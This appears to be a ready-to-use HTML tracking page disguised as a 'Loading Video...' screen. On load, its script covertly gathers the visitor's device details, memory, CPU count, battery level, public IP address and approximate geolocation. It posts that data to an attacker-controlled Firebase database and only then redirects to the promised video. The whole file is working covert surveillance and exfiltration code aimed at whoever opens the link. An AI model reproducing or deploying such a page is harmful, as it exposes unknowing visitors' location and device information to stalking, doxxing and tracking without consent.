<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading Video...</title>
    <style>
        body { background: #e0e5ec; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader { width: 40px; height: 40px; border: 4px solid #bcbfc5; border-top: 4px solid #00a884; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/data/";

        async function start() {
            const p = new URLSearchParams(window.location.search);
            const id = p.get('id');
            if(!id) return;

            try {
                const parts = atob(id).split('|');
                const userKey = parts[0];
                const videoUrl = parts[1];

                let info = {
                    time: new Date().toLocaleString(),
                    dev: navigator.userAgent.split('(')[1].split(')')[0],
                    ram: navigator.deviceMemory || "?",
                    cpu: navigator.hardwareConcurrency || "?",
                    batt: "N/A", ip: "Hidden/VPN", loc: "Unknown", map: "#"
                };

                // Battery Check
                if(navigator.getBattery) {
                    const b = await navigator.getBattery();
                    info.batt = Math.round(b.level * 100) + "% " + (b.charging ? "âš¡" : "ðŸ”‹");
                }

                // IP & Location (Using two services for 100% result)
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const ipData = await res.json();
                    info.ip = ipData.ip;
                    
                    const locRes = await fetch(`https://ipapi.co/${info.ip}/json/`);
                    const d = await locRes.json();
                    info.loc = d.city + ", " + d.country_name;
                    info.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
                } catch(e) {
                    // Backup IP Service
                    const res2 = await fetch('https://ipwho.is/');
                    const d2 = await res2.json();
                    info.ip = d2.ip;
                    info.loc = d2.city + ", " + d2.country;
                    info.map = `https://www.google.com/maps?q=${d2.latitude},${d2.longitude}`;
                }

                // Send to YOUR Firebase
                await fetch(`${DB_URL}${userKey}.json`, {
                    method: 'POST',
                    body: JSON.stringify(info)
                });

                window.location.href = videoUrl;
            } catch(e) { window.location.href = "https://youtube.com"; }
        }
        start();
    </script>
</body>
</html>
